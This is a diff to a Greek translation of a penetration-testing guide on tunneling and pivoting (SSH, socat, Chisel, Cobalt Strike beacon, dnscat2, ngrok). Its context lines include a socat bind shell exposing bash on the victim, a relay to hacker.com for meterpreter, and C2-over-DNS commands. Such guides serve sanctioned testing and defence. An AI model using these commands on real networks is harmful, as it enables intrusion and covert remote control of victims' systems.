@@ -31,7 +31,7 @@ SSH γραφική σύνδεση (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Τοπικό Port2Port
+### Local Port2Port
 
 Άνοιγμα νέας Θύρας στον SSH Server --> Άλλη θύρα
 ```bash
@@ -89,8 +89,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **υποδίκτυο** μέσω ενός host.\
-Για παράδειγμα, προωθώντας όλη την κίνηση που πηγαίνει στο 10.10.10.0/24
+Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **subnetwork** μέσω ενός host.\
+Για παράδειγμα, προωθώντας όλη την κίνηση που πηγαίνει προς 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Ανοίξτε μια θύρα στον server της ομάδας που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για να **δρομολογήσουν την κίνηση μέσω του beacon**.
+Ανοίξτε μια θύρα στον teamserver που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για **να δρομολογήσουν την κίνηση μέσω του beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -152,7 +152,7 @@ rportfwd stop [bind port]
 ```
 Για σημείωση:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση με τον Team Server, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
 - Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 - **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
@@ -175,7 +175,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Μπορείτε να το κατεβάσετε από τη σελίδα εκδόσεων του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για τον πελάτη και τον διακομιστή**
+Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για πελάτη και διακομιστή**
 
 ### socks
 ```bash
@@ -258,7 +258,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Δεσμευμένο κέλυφος
+### Δεσμός κελύφους
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
+Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στη κονσόλα του θύματος:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -294,7 +294,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh κονσόλα**
+**/bin/sh console**
 
 Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Πελάτης και Διακομιστής
 ```bash
@@ -312,7 +312,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου host
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -320,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).
+Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh client).
 
-Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
+Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh client, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -343,13 +343,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Πρέπει να έχετε **πρόσβαση RDP στο σύστημα**.\
+Πρέπει να έχετε **RDP πρόσβαση στο σύστημα**.\
 Κατεβάστε:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **την αποστολή πακέτων μέσω της σύνδεσης RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling πακέτων μέσω της σύνδεσης RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Στον υπολογιστή-πελάτη σας, φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
+Στον υπολογιστή-πελάτη σας φορτώστε **`SocksOverRDP-Plugin.dll`** έτσι:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -375,7 +375,7 @@ netstat -antb | findstr 1080
 ## Παράκαμψη proxy NTLM
 
 Το εργαλείο που αναφέρθηκε προηγουμένως: **Rpivot**\
-**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
+Το **OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -384,7 +384,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Αυθεντικοποιεί έναν proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
-Για παράδειγμα, προωθήστε τη θύρα 443
+Για παράδειγμα, προωθήστε τη θύρα 443.
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,8 +392,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
-Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
+Τώρα, αν ρυθμίσετε για παράδειγμα στην θυματική μηχανή την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
+Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην θύρα 2222.
 
 ## YARP
 
@@ -419,7 +419,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**
 
-Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα root.
+Establishes a C\&C channel through DNS. It doesn't need root privileges.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -442,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Αλλαγή DNS του proxychains
 
-Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει τα αιτήματα DNS tcp μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
+Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει το tcp DNS αίτημα μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
 
 ## Τούνελ σε Go
 
@@ -455,7 +455,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
+Απαιτείται δικαιώματα root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέτει λύσεις στο Διαδίκτυο με μία γραμμή εντολής.**\
-&#xNAN;_&#x45;xposition URI είναι όπως:_ **UID.ngrok.io**
+_&#x45;xposition URI είναι όπως:_ **UID.ngrok.io**
 
 ### Εγκατάσταση
 
@@ -498,7 +498,7 @@ chmod a+x ./ngrok
 
 _Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο._
 
-#### Τούνελινγκ TCP
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
